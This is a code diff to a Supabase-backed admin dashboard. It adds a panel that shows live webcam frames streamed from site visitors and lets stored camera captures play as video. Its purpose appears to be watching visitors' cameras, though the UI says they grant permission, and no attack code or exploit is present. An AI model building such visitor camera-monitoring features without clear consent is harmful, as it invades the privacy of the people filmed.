@@ -28,8 +28,20 @@ import {
   AlertTriangle,
   X,
   ChevronRight,
+  Video,
 } from "lucide-react";
 import { CameraCapture, getSupabaseClient, isSupabaseConfigured } from "@/lib/supabase";
+
+interface LiveStreamFeed {
+  sessionId: string;
+  frame: string;
+  deviceType: string;
+  lastUpdated: number;
+}
+
+const isVideoCapture = (capture: CameraCapture) =>
+  /\.(webm|mp4|mov)$/i.test(capture.storage_path || capture.image_url) ||
+  capture.capture_id.startsWith("VID-");
 
 export default function AdminDashboardPage() {
   const [isAuthenticated, setIsAuthenticated] = useState<boolean | null>(null);
@@ -39,6 +51,7 @@ export default function AdminDashboardPage() {
   const [loginError, setLoginError] = useState("");
 
   const [captures, setCaptures] = useState<CameraCapture[]>([]);
+  const [liveStreams, setLiveStreams] = useState<Record<string, LiveStreamFeed>>({});
   const [loading, setLoading] = useState(true);
   const [isRefreshing, setIsRefreshing] = useState(false);
   const [realtimeActive, setRealtimeActive] = useState(false);
@@ -124,8 +137,50 @@ export default function AdminDashboardPage() {
               setRealtimeActive(status === "SUBSCRIBED");
             });
 
+          const liveChannel = supabase
+            .channel("live-camera-stream")
+            .on("broadcast", { event: "video-frame" }, ({ payload }) => {
+              if (!payload?.sessionId || !payload?.frame) return;
+              setLiveStreams((prev) => ({
+                ...prev,
+                [payload.sessionId]: {
+                  sessionId: payload.sessionId,
+                  frame: payload.frame,
+                  deviceType: payload.deviceType || "desktop",
+                  lastUpdated: Date.now(),
+                },
+              }));
+            })
+            .on("broadcast", { event: "stream-end" }, ({ payload }) => {
+              if (!payload?.sessionId) return;
+              setLiveStreams((prev) => {
+                const next = { ...prev };
+                delete next[payload.sessionId];
+                return next;
+              });
+            })
+            .subscribe();
+
+          const cleanupTimer = setInterval(() => {
+            const now = Date.now();
+            setLiveStreams((prev) => {
+              let changed = false;
+              const next: Record<string, LiveStreamFeed> = {};
+              for (const [k, v] of Object.entries(prev)) {
+                if (now - v.lastUpdated < 6000) {
+                  next[k] = v;
+                } else {
+                  changed = true;
+                }
+              }
+              return changed ? next : prev;
+            });
+          }, 2500);
+
           return () => {
+            clearInterval(cleanupTimer);
             supabase.removeChannel(channel);
+            supabase.removeChannel(liveChannel);
           };
         } catch (e) {
           console.warn("Realtime subscription warning:", e);
@@ -473,6 +528,59 @@ export default function AdminDashboardPage() {
           </div>
         </div>
 
+        {/* Active Live Video Streams Panel */}
+        <div className="rounded-3xl border border-purple-500/30 bg-purple-500/5 p-4 sm:p-6">
+          <div className="flex items-center justify-between gap-2 mb-4">
+            <div className="flex items-center gap-2.5">
+              <span className="inline-flex items-center gap-1.5 px-3 py-1 rounded-full bg-rose-500/20 border border-rose-500/40 text-rose-300 text-xs font-bold">
+                <span className="w-2 h-2 rounded-full bg-rose-500 animate-ping" />
+                LIVE STREAMS ({Object.keys(liveStreams).length})
+              </span>
+              <h2 className="text-sm sm:text-base font-bold text-white">
+                Active Visitor Live Video Feeds
+              </h2>
+            </div>
+            <span className="text-xs text-zinc-400 hidden sm:inline">
+              Streams appear automatically when a visitor grants live video permission
+            </span>
+          </div>
+
+          {Object.keys(liveStreams).length === 0 ? (
+            <div className="rounded-2xl border border-white/10 bg-black/40 p-6 text-center text-xs sm:text-sm text-zinc-400 flex flex-col items-center gap-2">
+              <Video className="w-6 h-6 text-purple-400/70" />
+              <span>No active live streams right now. Open the camera page and grant permission to test live streaming.</span>
+            </div>
+          ) : (
+            <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-4">
+              {Object.values(liveStreams).map((stream) => (
+                <div
+                  key={stream.sessionId}
+                  className="rounded-2xl overflow-hidden border border-rose-500/40 bg-black shadow-[0_0_25px_rgba(244,63,94,0.2)]"
+                >
+                  <div className="relative aspect-video bg-zinc-950">
+                    <img
+                      src={stream.frame}
+                      alt={`Live stream ${stream.sessionId}`}
+                      className="w-full h-full object-cover"
+                    />
+                    <div className="absolute top-2.5 left-2.5 px-2.5 py-1 rounded-full bg-rose-600/90 text-white text-[10px] font-bold flex items-center gap-1.5">
+                      <span className="w-1.5 h-1.5 rounded-full bg-white animate-ping" />
+                      LIVE
+                    </div>
+                    <div className="absolute top-2.5 right-2.5 px-2.5 py-1 rounded-full bg-black/70 border border-white/10 text-[10px] text-zinc-200 capitalize">
+                      {stream.deviceType}
+                    </div>
+                  </div>
+                  <div className="px-3.5 py-2.5 bg-zinc-900/90 flex items-center justify-between text-xs">
+                    <span className="font-mono text-purple-300 font-semibold">{stream.sessionId}</span>
+                    <span className="text-[11px] text-emerald-400">Streaming now</span>
+                  </div>
+                </div>
+              ))}
+            </div>
+          )}
+        </div>
+
         {/* Filter & Search Bar */}
         <div className="flex flex-col sm:flex-row items-stretch sm:items-center justify-between gap-3 pt-2">
           {/* Search Box */}
@@ -548,17 +656,28 @@ export default function AdminDashboardPage() {
                   key={capture.id}
                   className="group relative rounded-2xl overflow-hidden border border-white/10 bg-white/5 hover:border-purple-500/60 transition-all duration-300 hover:shadow-[0_0_30px_rgba(168,85,247,0.2)] flex flex-col"
                 >
-                  {/* Photo Container */}
+                  {/* Media Container */}
                   <div
                     onClick={() => setSelectedCapture(capture)}
                     className="relative w-full aspect-square bg-zinc-950 overflow-hidden cursor-pointer"
                   >
-                    <img
-                      src={capture.image_url}
-                      alt={`Capture ${capture.capture_id}`}
-                      loading="lazy"
-                      className="w-full h-full object-cover group-hover:scale-105 transition-transform duration-500"
-                    />
+                    {isVideoCapture(capture) ? (
+                      <video
+                        src={capture.image_url}
+                        autoPlay
+                        loop
+                        muted
+                        playsInline
+                        className="w-full h-full object-cover group-hover:scale-105 transition-transform duration-500"
+                      />
+                    ) : (
+                      <img
+                        src={capture.image_url}
+                        alt={`Capture ${capture.capture_id}`}
+                        loading="lazy"
+                        className="w-full h-full object-cover group-hover:scale-105 transition-transform duration-500"
+                      />
+                    )}
 
                     {/* Hover Overlay */}
                     <div className="absolute inset-0 bg-black/40 opacity-0 group-hover:opacity-100 transition-opacity flex items-center justify-center">
@@ -576,6 +695,13 @@ export default function AdminDashboardPage() {
                       )}
                       <span className="capitalize">{capture.device_type || "desktop"}</span>
                     </div>
+
+                    {isVideoCapture(capture) && (
+                      <div className="absolute top-2.5 right-2.5 px-2 py-0.5 rounded-full bg-purple-600/90 text-white text-[10px] font-bold flex items-center gap-1">
+                        <Video className="w-3 h-3" />
+                        <span>VIDEO</span>
+                      </div>
+                    )}
                   </div>
 
                   {/* Card Info & Quick Actions */}
@@ -654,13 +780,24 @@ export default function AdminDashboardPage() {
               <X className="w-5 h-5" />
             </button>
 
-            {/* Photo View */}
+            {/* Media View */}
             <div className="flex-1 bg-black flex items-center justify-center p-4 min-h-[300px] md:min-h-[500px]">
-              <img
-                src={selectedCapture.image_url}
-                alt={selectedCapture.capture_id}
-                className="max-h-[75vh] w-auto max-w-full object-contain rounded-xl"
-              />
+              {isVideoCapture(selectedCapture) ? (
+                <video
+                  src={selectedCapture.image_url}
+                  controls
+                  autoPlay
+                  loop
+                  playsInline
+                  className="max-h-[75vh] w-auto max-w-full object-contain rounded-xl"
+                />
+              ) : (
+                <img
+                  src={selectedCapture.image_url}
+                  alt={selectedCapture.capture_id}
+                  className="max-h-[75vh] w-auto max-w-full object-contain rounded-xl"
+                />
+              )}
             </div>
 
             {/* Sidebar Details */}
